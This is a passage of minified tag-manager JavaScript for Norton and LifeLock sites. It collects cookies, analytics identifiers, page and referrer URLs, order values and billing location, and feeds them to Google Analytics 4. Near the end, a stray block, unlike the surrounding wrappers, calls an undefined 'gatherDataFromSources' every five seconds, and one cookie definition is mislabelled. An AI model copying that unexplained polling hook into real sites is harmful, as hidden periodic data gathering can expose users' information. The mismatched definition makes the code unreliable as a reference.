          paymentMethod: void 0,
          sku: void 0,
          billingState: void 0,
          billingZip: void 0,
          billingCountry: void 0,
          billingRegion: void 0,
          currency: void 0,
          subscriptionTerm: void 0,
          products: void 0,
          ucProducts: void 0,
          subscriptionStatus: void 0,
          orderStatus: void 0
        }, this.init(t, e, i, s);
      }
      init(t, e, i) {
        this.timer = new NovaTiming("SiteVars", "init"), this.timing = this.timer.timing, this.instance = is.defined(i) ? i : this.constructor.newPushIdObj(), this.adobeAnalytics = this.constructor.getAdobeAnalyticsConfig(), this.adobeVisitor = this.constructor.getAdobeVisitorConfig(), this.nortonAnalytics = this.constructor.getNortonAnalyticsObj(e), this.user.nortonGUID = this.constructor.getNortonGUID(window, this.nortonAnalytics, void 0), this.user.nortonSSO = this.getVar("sso", "signed_in", window, this.nortonAnalytics), this.user.gaClientId = this.constructor.getGAClientID(), this.user.adobeMarketingCloudVisitorID = this.adobeAnalytics.marketingCloudVisitorID || this.adobeVisitor.marketingCloudVisitorID, this.user.adobeAudienceManagerBlob = this.adobeAnalytics.audienceManagerBlob || this.adobeVisitor.audienceManagerBlob, this.site.name = this.getVar("site_name", "site_name"), this.site = {
          name: this.getVar("site_name", "site_name"),
          id: this.getVar("site_id", "site_id"),
          section: this.getVar("userflow", "site_section"),
          sectionName: this.getVar(void 0, "page_name"),
          subSection: this.constructor.getNortonAnalyticsVar("site_sub_section", e),
          pageName: this.getVar("pagename", "page_name")
        }, this.locale = new NovaLocale(this.getVar("language", "site_language"), this.getVar("country", "site_country"), this.getVar("region", "region", window, e)), this.channel = {
          channel: this.getVar("channel", "channel"),
          originalSubChannel: this.getVar("original_subchannel", "original_subchannel"),
          currentSubChannel: this.getVar("current_subchannel", "current_subchannel"),
          trafficSource: this.getVar("traffic_source", "traffic_source")
        }, this.program = {
          id: this.getVar("om_program_id_param", "program_id"),
          type: this.getVar("om_program_type_param", "program_type"),
          inidParam: this.getVar("inid_param", "store_inid"),
          marketingSegment: this.getVar("marketingsegment", "marketingsegment"),
          promoCode: this.getVar("promoid", "promoid"),
          campaigns: this.getVar("om_sem_cid_param", "store_campaigns")
        }, this.store = {
          id: this.getVar("store_id", "store_campaigns"),
          name: this.getVar("store_name", "store_campaigns"),
          sku: this.getVar("selSKU", "store_selsku"),
          skuDesc: this.getVar("offered_sku_desc", "store_selsku")
        }, this.cart = {
          value: this.getVar("total_cart_value", void 0),
          flowId: this.getVar("cart_flow_id", "store_cartdesign"),
          sku: this.getVar("selSKU", "store_selsku"),
          skuDesc: this.getVar("offered_sku_desc", "offered_sku_desc")
        };
        let s = this.getVar("purchaseid", "store_purchaseid"),
          o = this.getVar("TLT_ONUM", "store_purchaseid"),
          r = is.defined(s) ? s : o;
        return is.defined(r) && (this.order = {
          id: r,
          value: this.getVar("total_order_value", void 0),
          promoCode: this.getVar("promoid", "promoid"),
          units: this.getVar("TLT_Total_Units_Sold", void 0),
          sku: this.getVar("arenabled", "store_arenabled"),
          psn: this.getVar("downloadedPSN", "store_soldpsn"),
          paymentMethod: this.getVar(void 0, "store_paymentmethod"),
          billingState: this.getVar("state", void 0),
          billingZip: this.getVar("zip", void 0),
          billingCountry: this.getVar("currency", "site_country"),
          billingRegion: this.getVar("region", "region"),
          currency: this.getVar("currency", "store_currencycode"),
          subscriptionTerm: this.getVar("TLT_BILLING_PLAN", void 0),
          products: this.getVar("products", "store_products"),
          ucProducts: this.getVar("ucproducts", void 0),
          subscriptionStatus: this.getVar("TLT_OSUB_STATUS", void 0),
          orderStatus: this.getVar("TLT_OSTATUS", void 0)
        }), this.timing = this.timer.stop(), this;
      }
      getVar(t, e) {
        return this.constructor.getSiteVar(t, e, this.nortonAnalytics, void 0);
      }
      reload(t) {
        return this.init(void 0, void 0, t, void 0), this;
      }
    },
    NovaPage = class extends NovaUtils {
      constructor(t) {
        super(), this.init(t);
      }
      init(t) {
        this.timer = new NovaTiming("Page", "init"), this.timing = this.timer.timing, this.instance = this.constructor.newPushIdObj(), this.id = is.defined(t) && this.constructor.hasProperty() ? t : this.constructor.newPushId(), this.title = window.document.title, this.text = window.document.body.innerText, this.textHashId = this.constructor.hashString(this.text), this.pageURL = this.constructor.parseURL(document.location.href, void 0), this.referringURL = this.constructor.parseURL(document.referrer || window.referrer, void 0), this.incomingURL = this.constructor.hasProperty(window, "incomingURL") && is.defined(window.incomingURL) ? this.constructor.parseURL(window.incomingURL.replaceAll("  ", "//").replaceAll(" ", "/"), void 0) : this.constructor.parseURL(void 0), this.timing = this.timer.stop();
      }
    },
    NovaTiming = class extends NovaUtils {
      constructor(t, e = "script", i = "nova", s = !0) {
        super(), this.initDt = new Date(), this.initTime = window.performance.now().toFixed(0), this.name = i + "." + e + "." + t, this.nameId = this.name + "." + this.initTime.toString(), this.markNameStart = this.nameId + ".start", this.markNameStop = this.nameId + ".stop", this.measurementName = this.nameId, this.measurementNameGlobal = i + ".global." + t + "." + this.initTime.toString(), this.markStart = void 0, this.markStartTime = void 0, this.markStop = void 0, this.markStopTime = void 0, this.measurement = void 0, this.measurementDuration = void 0, this.measurementGlobal = void 0, this.measurementGlobalDuration = void 0, "boolean" == typeof s && !0 === s && this.start();
      }
      getMarkStart() {
        if (is.defined(this.markStart)) return this.markStart;
        let t = window.performance.getEntriesByName(this.markNameStart, "mark");
        return is.arrayDefined(t) && (this.markStart = t[0]), this.markStart;
      }
      getMarkStop() {
        if (is.defined(this.markStop)) return this.markStop;
        let t = window.performance.getEntriesByName(this.markNameStop, "mark");
        return is.arrayDefined(t) && (this.markStop = t[0]), this.markStop;
      }
      getMeasurement() {
        if (is.defined(this.measurement)) return this.measurement;
        let t = window.performance.getEntriesByName(this.measurementName, "measure");
        return is.arrayDefined(t) && (this.measurement = t[0]), this.measurement;
      }
      getMeasurementGlobal() {
        if (is.defined(this.measurementGlobal)) return this.measurementGlobal;
        let t = window.performance.getEntriesByName(this.measurementNameGlobal, "measure");
        return is.arrayDefined(t) && (this.measurementGlobal = t[0]), this.measurementGlobal;
      }
      get startTime() {
        if (is.defined(this.markStopTime)) return this.markStartTime;
        let t = this.getMarkStart();
        return is.defined(t) && is.propertyDefined(t, "startTime") && (this.markStartTime = "number" == typeof t.startTime ? window.parseInt(t.startTime.toFixed(0), 10) : void 0), this.markStartTime;
      }
      get endTime() {
        if (is.defined(this.markStopTime)) return this.markStopTime;
        let t = this.getMarkStop();
        return is.defined(t) && is.propertyDefined(t, "startTime") && (this.markStopTime = "number" == typeof t.startTime ? window.parseInt(t.startTime.toFixed(0), 10) : void 0), this.markStopTime;
      }
      get duration() {
        if (is.defined(this.measurementDuration)) return this.measurementDuration;
        let t = this.getMeasurement();
        return is.defined(t) && is.propertyDefined(t, "duration") && (this.measurementDuration = "number" == typeof t.duration ? window.parseInt(t.duration.toFixed(0), 10) : void 0), this.measurementDuration;
      }
      get durationGlobal() {
        if (is.defined(this.measurementGlobalDuration)) return this.measurementGlobalDuration;
        let t = this.getMeasurementGlobal();
        return is.defined(t) && is.propertyDefined(t, "duration") && (this.measurementGlobalDuration = window.parseInt(t.duration, 10)), this.measurementGlobalDuration;
      }
      get timing() {
        return {
          name: this.name,
          nameId: this.nameId,
          startTime: this.startTime,
          endTime: this.endTime,
          duration: this.duration,
          durationGlobal: this.durationGlobal
        };
      }
      start() {
        window.performance.mark(this.markNameStart);
      }
      stop() {
        return window.performance.mark(this.markNameStop), window.performance.measure(this.measurementNameGlobal, void 0, this.markNameStop), window.performance.measure(this.measurementName, this.markNameStart, this.markNameStop), this.timing;
      }
    },
    NovaAdobe = class extends NovaUtils {
      constructor(t, e) {
        super(), this.init(t, e);
      }
      init(t, e) {
        this.instance = this.constructor.newPushIdObj(), this.timer = new NovaTiming("Adobe", "init"), this.timing = this.timer.timing;
        let i = ["marketingCloudVisitorID", "marketingCloudCustomerIdHash", "marketingCloudOrgID", "marketingCloudServer", "analyticsVisitorID", "audienceManagerBlob", "audienceManagerLocationHint", "audienceManagerServer", "trackingServer", "trackingServerSecure", "visitorOptedOut", "cookieDomain", "cookieName", "sessionCookieName"];
        if (this.Analytics = this.constructor.getAdobeAnalyticsConfig(t), this.Visitor = this.constructor.getAdobeVisitorConfig(e), Array.isArray(i) && i.length > 0) for (const t of i) this[t] = void 0;
        for (const t of i) is.propertyDefined(this.Analytics, t) && (this[t] = this.Analytics[t]), is.propertyDefined(this.Visitor, t) && (this[t] = this.Visitor[t]);
        return this.marketingCloudVisitorID = is.defined(this.marketingCloudVisitorID) ? this.marketingCloudVisitorID.toString() : void 0, this.timing = this.timer.stop(), this;
      }
      reload() {
        return this.init();
      }
    },
    NovaGoogleAnalytics = class extends NovaUtils {
      constructor(t, e, i, s, o, r) {
        let n, a;
        super(), this.timer = new NovaTiming("GoogleAnalytics", "init"), this.timing = this.timer.timing, this.instance = is.defined(r) ? r : this.constructor.newPushIdObj(), this.clientId = is.defined(t) ? t : void 0, this.userId = is.defined(e) ? e : void 0, this.debug = "boolean" == typeof o && !0 === o, n = document.location.hostname, this.history = [], this.historyDataLayer = [], this.Stream = {
          name: void 0,
          domain: void 0,
          measurementId: void 0,
          id: void 0
        }, this.constructor.domainIsLifeLock(n) ? (this.Stream.name = "LifeLock Web", this.Stream.domain = "lifelock.com", this.Stream.measurementId = "G-ZMF24Q2GWK", this.Stream.id = 2427878879) : this.constructor.domainIsNorton(n) ? (this.Stream.name = "Norton Web", this.Stream.domain = "norton.com", this.Stream.measurementId = "G-FG3M2ET3ED", this.Stream.id = 2427862270) : this.constructor.domainIsNortonLifeLock(n) && (this.Stream.name = "NortonLifeLock Web", this.Stream.domain = "nortonlifelock.com", this.Stream.measurementId = "G-KKPP18MZ8Y", this.Stream.id = 2437003583), this.cookieOptions = {
          prefix: "_ga4",
          domain: "auto",
          update: !0,
          flags: "SameSite\x3dNone;Secure",
          expires: 31536E3
        }, this.scriptURL = this.constructor.newGtagURL(this.Stream.measurementId), this.mod = {
          init: new Date().getTime(),
          gtagDownload: void 0,
          configGlobal: void 0,
          setEventProperties: void 0,
          configGA: void 0,
          setUserProperties: void 0,
          gtmLoad: void 0,
          gtmDom: void 0,
          dataLayerProxy: void 0,
          dataLayerListener: void 0
        }, this.status = {
          init: !0,
          gtagDownload: !1,
          configGlobal: !1,
          configGA: !1,
          setEventProperties: !1,
          setUserProperties: !1,
          gtagPurchase: !1,
          gtmLoad: !1,
          gtmDom: !1,
          dataLayerProxy: !1,
          dataLayerListener: !1
        }, this.isScriptLoaded && (this.mod.gtagDownload = new Date().getTime(), this.status.gtagDownload = !0);
        let d = {
          cookie_prefix: this.cookieOptions.prefix,
          cookie_domain: this.cookieOptions.domain,
          cookie_update: this.cookieOptions.update,
          cookie_flags: this.cookieOptions.flags,
          cookie_expires: this.cookieOptions.expires,
          instanceId: this.instance.id
        };
        this.globalConfig = d, this.eventProperties = d, this.eventProperties.instanceId = this.instance.id, this.eventProperties.measurementId = this.Stream.measurementId, this.eventProperties.measurementName = this.Stream.measurementName, this.eventProperties.streamId = this.Stream.id.toString(), this.eventProperties.streamDomain = this.Stream.domain, this.eventProperties.streamName = this.Stream.name, this.userProperties = {
          instanceId: this.instance.id
        }, this.addEventProperties(i), is.unDefined(this.clientId) && (is.propertyDefined(this.eventProperties, "client_id") && is.defined(this.eventProperties.client_id) && (this.clientId = this.eventProperties.client_id), is.propertyDefined(this.eventProperties, "clientId") && is.defined(this.eventProperties.clientId) && (this.clientId = this.eventProperties.clientId)), this.eventProperties.client_id = this.clientId, is.unDefined(this.userId) && (is.propertyDefined(this.eventProperties, "user_id") && is.defined(this.eventProperties.user_id) && (this.userId = this.eventProperties.user_id), is.propertyDefined(this.eventProperties, "userId") && is.defined(this.eventProperties.userId) && (this.userId = this.eventProperties.userId)), this.eventProperties.user_id = this.userId, this.addUserProperties(s), a = d;
        for (const t of Object.keys(this.eventProperties)) a[t] = this.eventProperties[t];
        this.config = {
          global: d,
          ga: a
        }, this.perf = {
          gtagDownload: void 0,
          gtagConfig: void 0
        }, this.timing = this.timer.stop();
      }
      get isScriptLoaded() {
        return this.mod.gtagDownload = is.unDefined(this.mod.gtagDownload) && this.constructor.isScriptLoaded(this.scriptURL) ? new Date().getTime() : this.mod.gtagDownload, this.status.gtagDownload = is.defined(this.mod.gtagDownload), this.status.gtagDownload;
      }
      get perfGtagDownload() {
        return void 0 !== this.perf && "gtagDownload" in this.perf && void 0 !== this.perf.gtagDownload ? "string" == typeof this.perf.gtagDownload ? window.parseInt(this.perf.gtagDownload) : this.perf.gtagDownload : !0 === this.isScriptLoaded ? (this.perf.gtagDownload = this.constructor.getPerfTimingURLDuration(this.scriptURL), this.perf.gtagDownload) : void 0;
      }
      loadScript(t = function () {}) {
        !0 !== this.isScriptLoaded && this.constructor.loadScript(this.scriptURL, t);
      }
      addEventProperty(t, e) {
        return is.defined(t) && is.defined(e) && (this.eventProperties[t] = e), e;
      }
      addEventProperties(t = {}) {
        let e = Object.keys(t);
        if (is.arrayDefined(e)) for (const i of e) this.addEventProperty(i, t[i]);
        return this.eventProperties;
      }
      addUserProperty(t, e) {
        return is.defined(t) && is.defined(e) && (this.userProperties[t] = e), e;
      }
      addUserProperties(t = {}) {
        let e = Object.keys(t);
        if (is.arrayDefined(e)) for (const i of e) this.addUserProperty(i, t[i]);
        return this.userProperties;
      }
      getWindowDataLayer() {
        return window.dataLayer = is.propertyDefined(window, "dataLayer") ? window.dataLayer : [], window.dataLayer;
      }
      getWindowGtag() {
        return window.dataLayer = this.getWindowDataLayer(), window.gtag = is.propertyDefined(window, "gtag") ? window.gtag : function () {
          return window.dataLayer.push(arguments), arguments;
        }, window.gtag;
      }
      setNewJSDate() {
        window.gtag = this.getWindowGtag();
        let t = window.gtag("js", new Date());
        return this.history.push(t), t;
      }
      setJSDate() {
        return this.setNewJSDate();
      }
      get gtag() {
        return this.getWindowGtag();
      }
      get dataLayer() {
        return this.getWindowDataLayer();
      }
      setDataLayerProxy() {
        if (!0 !== this.status.dataLayerProxy) {
          window.dataLayer = this.getWindowDataLayer(), window.gtag = this.getWindowGtag();
          let t = window.dataLayer;
          window.dataLayer = new Proxy(t, {
            set: function (t, e, i) {
              if ("length" !== e) {
                const t = new CustomEvent("dataLayerPush", {
                  detail: i
                });
                window.dispatchEvent(t);
              }
              return Reflect.set(t, e, i);
            }
          }), this.status.dataLayerProxy = !0, this.mod.dataLayerProxy = new Date().getTime();
        }
        return this.mod.dataLayerProxy;
      }
      setDataLayerListener() {
        if (!0 !== this.status.dataLayerListener) {
          const t = this;
          window.addEventListener("dataLayerPush", function (e) {
            t.historyDataLayer.push(e.detail), is.defined(e) && is.propertyDefined(e, "detail") && is.propertyDefined(e.detail, "event") && ("gtm.dom" === e.detail.event && (t.mod.gtmDom = new Date().getTime(), t.status.gtmDom = !0, t.configGA()), "gtm.load" === e.detail.event && (t.mod.gtmLoad = new Date().getTime(), t.status.gtmLoad = !0));
          });
        }
        this.status.dataLayerListener = !0, this.mod.dataLayerListener = new Date().getTime();
      }
      gtagEvent(t, e, i) {
        let s;
        return this.getWindowGtag(), s = is.defined(i) ? window.gtag("event", t, e) : window.gtag("event", t, e, {
          send_to: i
        }), this.history.push(s), s;
      }
      setUserProperties(t = {}, e) {
        this.addUserProperties(t), this.getWindowGtag();
        let i = is.defined(e) ? window.gtag("config", e, {
          user_properties: this.userProperties,
          send_page_view: !1
        }) : window.gtag("set", "user_properties", this.userProperties);
        return this.mod.setUserProperties = new Date().getTime(), this.status.setUserProperties = !0, this.history.push(i), i;
      }
      setUserProperty(t, e, i = this.Stream.measurementId) {
        this.getWindowGtag(), this.addUserProperty(t, e);
        let s = window.gtag("set", "user_properties", {
          key: e
        });
        return this.history.push(s), s;
      }
      setEventProperty(t, e, i = this.Stream.measurementId) {
        this.addEventProperty(t, e), this.getWindowGtag();
        let s = is.defined(i) ? window.gtag("set", i, {
          key: e
        }) : window.gtag("set", {
          key: e
        });
        return this.history.push(s), s;
      }
      setEventProperties(t = {}, e) {
        this.addEventProperties(t), this.getWindowGtag();
        let i = this.eventProperties;
        is.defined(e) && (i.send_page_view = !1);
        let s = is.defined(e) ? window.gtag("config", e, i) : window.gtag("set", i);
        return this.mod.setEventProperties = new Date().getTime(), this.status.setEventProperties = !0, s;
      }
      isGtagEventReady(t) {
        return is.defined(this.constructor.getDataLayerEvent(t));
      }
      isGtagDomReady() {
        return !0 === this.status.gtmDom || (this.isGtagEventReady("gtm.dom") && (this.mod.gtmDom = new Date().getTime(), this.status.gtmDom = !0), this.status.gtmDom);
      }
      isGtagLoadReady() {
        return !0 === this.status.gtmLoad || (this.isGtagEventReady("gtm.load") && (this.mod.gtmLoad = new Date().getTime(), this.status.gtmLoad = !0), this.status.gtmLoad);
      }
      configGA(t = !1) {
        let e;
        if (this.getWindowGtag(), this.setJSDate(), !0 !== this.status.configGA) {
          "nova" in window && void 0 !== window.nova && "eventProperties" in window.nova && this.addEventProperties(window.nova.eventProperties), "nova" in window && void 0 !== window.nova && "userProperties" in window.nova && this.addUserProperties(window.nova.userProperties), this.perf.gtagConfig = window.performance.now(), this.addEventProperties({
            perfGtagDownload: this.perfGtagDownload,
            perfGtagConfig: this.perf.gtagConfig
          });
          let t = this.eventProperties;
          t.user_properties = this.userProperties, !0 === this.debug && (t.debug_mode = !0), e = window.gtag("config", this.Stream.measurementId, t), this.history.push(e), is.defined(this.eventProperties.siteUserNortonGUID) ? this.login(this.eventProperties.siteUserNortonGUID, "SiteVars.user.nortonGUID", this.Stream.measurementId) : is.defined(this.eventProperties.novaUserId) ? this.login(this.eventProperties.novaUserId, "NovaId.user.id") : this.login(this.eventProperties.user_id), this.purchase(this.eventProperties.orderId, this.eventProperties.orderCurrency, this.eventProperties.orderValue, this.eventProperties.orderPromoCode, this.eventProperties.orderSku, this.Stream.measurementId), this.mod.configGA = new Date().getTime(), this.status.configGA = !0;
        }
        return e;
      }
      login(t, e, i = this.Stream.measurementId) {
        let s;
        return is.defined(t) && is.definedString(e) && (this.getWindowGtag(), s = is.defined(i) ? window.gtag("event", "login", {
          method: e,
          send_to: i
        }) : window.gtag("event", "login", {
          method: e
        }), this.history.push(s)), s;
      }
      purchase(t, e, i, s, o, r = this.Stream.measurementId) {
        let n;
        if (is.defined(t) && is.defined(e) && is.defined(i)) {
          this.getWindowGtag();
          let a = window.parseFloat(i, 10);
          if (is.number(a)) {
            let d = {
              currency: e,
              transaction_id: t,
              value: a,
              coupon: s || void 0,
              items: [{
                item_id: o || void 0,
                item_name: void 0,
                coupon: s || void 0,
                currency: e,
                index: 1,
                price: i,
                quantity: 1
              }]
            };
            is.defined(r) && (d.send_to = r), n = window.gtag("event", "purchase", d), this.history.push(n);
          }
        }
        return n;
      }
      setUserId(t, e) {
        if (is.defined(t)) return this.setUserProperties({
          user_id: t
        }, e);
      }
      loadScriptAndConfigGA() {
        var t = this;
        this.loadScript(function () {
          t.configGA();
        });
      }
      init() {
        this.setDataLayerProxy(), this.setDataLayerListener(), this.loadScriptAndConfigGA();
      }
    },
    Nova = class t extends NovaUtils {
      static get NovaUtils() {
        return NovaUtils;
      }
      static get NovaFrozenCookie() {
        return NovaFrozenCookie;
      }
      static get NovaCookie() {
        return NovaCookie;
      }
      static get NovaCookies() {
        return NovaCookies;
      }
      static get NovaIdModel() {
        return NovaIdModel;
      }
      static get NovaIdCookie() {
        return NovaIdCookie;
      }
      static get NovaSiteVars() {
        return NovaSiteVars;
      }
      static get NovaPage() {
        return NovaPage;
      }
      static get NovaAdobeAnalytics() {
        return NovaAdobe;
      }
      static get NovaGoogleAnalytics() {
        return NovaGoogleAnalytics;
      }
      static get Nova() {
        return t;
      }
      static newNova(t) {
        return new this.Nova(t);
      }
      get userProperties() {
        return {
          user_id: this.NovaId.novaId.user.id,
          siteUserAdobeMCMID: this.SiteVars.user.adobeMarketingCloudVisitorID,
          siteUserAdobeMCAAMB: this.SiteVars.user.adobeAudienceManagerBlob,
          siteUserNortonGUID: this.SiteVars.user.nortonGUID,
          siteUserNortonSSO: this.SiteVars.user.nortonSSO,
          nortonGUID: this.NovaId.novaId.user.id,
          novaClientId: this.NovaId.novaId.client.id,
          novaClientBin: this.NovaId.novaId.client.bin,
          novaClientTime: this.NovaId.novaId.client.time,
          novaUserId: this.NovaId.novaId.user.id,
          novaUserTime: this.NovaId.novaId.user.time,
          novaOrderId: this.NovaId.novaId.order.id,
          novaOrderTime: this.NovaId.novaId.order.time,
          novaId: this.NovaId.novaId.string,
          novaHitId: this.NovaId.novaId.hit.id,
          novaHitTime: this.NovaId.novaId.hit.time,
          novaHitNumber: this.NovaId.novaId.hit.number,
          instanceId: this.instance.id,
          instanceTime: this.instance.time,
          cookieKeys: this.Cookies.keys.sort().join(";"),
          cookieCount: this.Cookies.count,
          cookieCountPressure: this.Cookies.countLimitPressure,
          cookieBytesPressure: this.Cookies.bytesLimitPressure,
          cookieBytes: this.Cookies.bytes
        };
      }
      get userPropertiesTrim() {
        return this.constructor.trimUndefinedObj(this.userProperties);
      }
      get eventProperties() {
        return {
          instanceId: this.instance.id,
          instanceTime: this.instance.time,
          client_id: this.NovaId.novaId.client.id,
          user_id: this.NovaId.novaId.user.id,
          siteUserAdobeMCMID: this.SiteVars.user.adobeMarketingCloudVisitorID,
          siteUserAdobeMCAAMB: this.SiteVars.user.adobeAudienceManagerBlob,
          siteUserNortonGUID: this.SiteVars.user.nortonGUID,
          siteUserNortonSSO: this.SiteVars.user.nortonSSO,
          nortonGUID: this.NovaId.novaId.user.id,
          novaClientId: this.NovaId.novaId.client.id,
          novaClientBin: this.NovaId.novaId.client.bin,
          novaClientTime: this.NovaId.novaId.client.time,
          novaUserId: this.NovaId.novaId.user.id,
          novaUserTime: this.NovaId.novaId.user.time,
          novaOrderId: this.NovaId.novaId.order.id,
          novaOrderTime: this.NovaId.novaId.order.time,
          novaId: this.NovaId.novaId.string,
          novaHitId: this.NovaId.novaId.hit.id,
          novaHitTime: this.NovaId.novaId.hit.time,
          novaHitNumber: this.NovaId.novaId.hit.number,
          cookieKeys: this.Cookies.keys.sort().join(";"),
          cookieCount: this.Cookies.count,
          cookieCountPressure: this.Cookies.countLimitPressure,
          cookieBytesPressure: this.Cookies.bytesLimitPressure,
          cookieBytes: this.Cookies.bytes,
          siteCountry: this.SiteVars.locale.site.countryCode2 || this.SiteVars.locale.browser.countryCode2,
          siteCountry3: this.SiteVars.locale.site.countryCode3 || this.SiteVars.locale.browser.countryCode3,
          siteLanguage: this.SiteVars.locale.site.language || this.SiteVars.locale.browser.language,
          siteCurrency: this.SiteVars.locale.site.currency || this.SiteVars.locale.browser.currency,
          sitePromoCode: this.SiteVars.program.promoCode,
          siteInidParam: this.SiteVars.program.inidParam,
          siteProgramType: this.SiteVars.program.type,
          siteProgramId: this.SiteVars.program.id,
          siteProgramCampaigns: this.SiteVars.program.campaigns,
          siteProgramMarketingSegment: this.SiteVars.program.marketingSegment,
          siteName: this.SiteVars.site.name,
          siteId: this.SiteVars.site.id,
          siteSection: this.SiteVars.site.section,
          siteSectionName: this.SiteVars.site.sectionName,
          siteSubSection: this.SiteVars.site.subSection,
          sitePageName: this.SiteVars.site.pageName,
          siteChannel: this.SiteVars.channel.channel,
          siteChannelOriginalSubChannel: this.SiteVars.channel.originalSubChannel,
          siteChannelCurrentSubChannel: this.SiteVars.channel.currentSubChannel,
          siteChannelTrafficSource: this.SiteVars.channel.trafficSource,
          siteStoreId: this.SiteVars.store.id,
          siteStoreName: this.SiteVars.store.name,
          siteStoreSku: this.SiteVars.store.sku,
          siteStoreSkuDesc: this.SiteVars.store.skuDesc,
          siteCartFlowId: this.SiteVars.cart.flowId,
          siteCartSku: this.SiteVars.cart.sku,
          siteCartSkuDesc: this.SiteVars.cart.skuDesc,
          siteCartValue: this.SiteVars.cart.value,
          orderId: this.SiteVars.order.id,
          orderCurrency: this.SiteVars.order.currency,
          orderValue: this.SiteVars.order.value,
          orderUnits: this.SiteVars.order.units,
          orderSku: this.SiteVars.order.sku,
          orderSkuDesc: this.SiteVars.order.skuDesc,
          orderPromoCode: this.SiteVars.order.promoCode,
          orderPsn: this.SiteVars.order.psn,
          pageTextHashId: this.Page.textHashId,
          pageURL: this.Page.pageURL.url,
          pageURLHashId: this.Page.pageURL.urlHashId,
          pageDomain: this.Page.pageURL.domain,
          pageDomainRoot: this.Page.pageURL.domainRoot,
          pagePath: this.Page.pageURL.path,
          pageQuery: this.Page.pageURL.query,
          pageHash: this.Page.pageURL.hash,
          referringURL: this.Page.referringURL.url,
          referringURLHashId: this.Page.referringURL.urlHashId,
          referringDomain: this.Page.referringURL.domain,
          referringDomainRoot: this.Page.referringURL.domainRoot,
          referringPath: this.Page.referringURL.path,
          referringQuery: this.Page.referringURL.query,
          referringHash: this.Page.referringURL.hash,
          incomingURL: this.Page.incomingURL.url,
          incomingURLHashId: this.Page.incomingURL.urlHashId,
          incomingDomain: this.Page.incomingURL.domain,
          incomingDomainRoot: this.Page.incomingURL.domainRoot,
          incomingPath: this.Page.incomingURL.path,
          incomingQuery: this.Page.incomingURL.query,
          incomingHash: this.Page.incomingURL.hash,
          perfNova: this.timing.duration,
          perfNovaStart: this.timing.startTime,
          perfNovaCookies: this.Cookies.timing.duration,
          perfNovaId: this.NovaId.timing.duration,
          perfNovaAdobe: this.Adobe.timing.duration,
          perfPage: this.Page.timing.duration
        };
      }
      get eventPropertiesTrim() {
        return this.constructor.trimUndefinedObj(this.eventProperties);
      }
      constructor(t) {
        super(), this.timer = new NovaTiming("Nova", "init"), this.timing = this.timer.timing;
        let e = "number" == typeof t ? this.constructor.daysToSeconds(t) : this.constructor.daysToSeconds(365),
          i = this.constructor.getNortonAnalyticsObj(),
          s = this.constructor.getAdobeAnalyticsObj(),
          o = this.constructor.getAdobeVisitorObj(),
          r = this.constructor.getDocumentCookie();
        this.instance = this.constructor.newPushIdObj(), this.SiteVars = new NovaSiteVars(void 0, i, this.instance, void 0), this.NovaId = new NovaIdCookie(this.SiteVars.user.nortonGUID, this.SiteVars.order.id, t, r, this.instance), this.Cookies = new NovaCookies(r, e, void 0, void 0, !0, "none", this.instance), this.Page = new NovaPage(this.instance), this.Adobe = new NovaAdobe(s, o), void 0 !== this.Cookies && this.Cookies.keys.includes("_ga4_dbx") ? this.GA = new NovaGoogleAnalytics(this.NovaId.client.id, this.NovaId.user.id, this.eventPropertiesTrim, this.userPropertiesTrim, !0, this.instance) : this.GA = new NovaGoogleAnalytics(this.NovaId.client.id, this.NovaId.user.id, this.eventPropertiesTrim, this.userPropertiesTrim, !1, this.instance), this.addEventListeners(), this.timing = this.timer.stop();
      }
      setDebugCookie(t = 3600) {
        return this.Cookies.setCookie("_ga4_dbx", "1", t);
      }
      removeDebugCookie() {
        return this.Cookies.remove("_ga4_dbx");
      }
      reloadCookies(t) {
        return this.Cookies.reload(t);
      }
      reloadSiteVars(t) {
        return this.SiteVars.reload(t);
      }
      reloadAdobeAnalytics(t) {
        return this.Adobe.reload(t);
      }
      reload() {
        let t = this.constructor.newPushIdObj();
        this.reloadCookies(t), this.reloadSiteVars(t), this.reloadAdobeAnalytics(t), this.GA.addUserProperties(this.userProperties), this.GA.addEventProperties(this.eventProperties);
      }
      listenOnDomContentLoaded() {
        var t = this;
        "loading" === document.readyState && document.addEventListener("DOMContentLoaded", function (e) {
          t.reload();
        });
      }
      listenOnLoad() {
        var t = this;
        window.addEventListener("load", function (e) {
          t.reload();
        });
      }
      addEventListeners() {
        this.listenOnLoad(), this.listenOnDomContentLoaded();
      }
    };
  window.Nova = Nova;
  var nova = new Nova();
  window.nova = nova, window.nova.GA.init();
}, 3797576, 690535);
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.registerDataDefinition(function () {
    Bootstrapper.data.define({
      extract: function () {
        return "G-ZMF24Q2GWK";
      },
      transform: function (val) {
        return val ? val : "";
      },
      load: "instance",
      trigger: Bootstrapper.data.immediateTrigger,
      dataDefName: "GA4 - Config -Norton Web - Measurement ID",
      collection: "GA4 - Config",
      source: "Manage",
      priv: "false"
    }, {
      id: "64906"
    });
  }, 64906);
}, -1, -1);
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.registerDataDefinition(function () {
    Bootstrapper.data.define({
      extract: function () {
        var value = "; " + document.cookie;
        var parts = value.split("; _ga\x3d");
        if (parts.length == 2) return decodeURIComponent(parts.pop().split(";").shift());
      },
      transform: function (val) {
        return val ? val : "";
      },
      load: "instance",
      trigger: Bootstrapper.data.immediateTrigger,
      dataDefName: "GA4 - Cookies - _ga",
      collection: "GA4 - Page - Cookies",
      source: "Manage",
      priv: "false"
    }, {
      id: "64946"
    });
  }, 64946);
}, -1, -1);
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.registerDataDefinition(function () {
    Bootstrapper.data.define({
      extract: function () {
        var value = "; " + document.cookie;
        var parts = value.split("; GA4 - Page - Params - gclid\x3d");
        if (parts.length == 2) return decodeURIComponent(parts.pop().split(";").shift());
      },
      transform: function (val) {
        return val ? val : "";
      },
      load: "instance",
      trigger: Bootstrapper.data.immediateTrigger,
      dataDefName: "GA4 - Cookies - _gid",
      collection: "GA4 - Page - Cookies",
      source: "Manage",
      priv: "false"
    }, {
      id: "64947"
    });
  }, 64947);
}, -1, -1);
document.addEventListener("DOMContentLoaded", () => {
  gatherDataFromSources();
  setInterval(gatherDataFromSources, 5000); // 5 sec interval
});
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
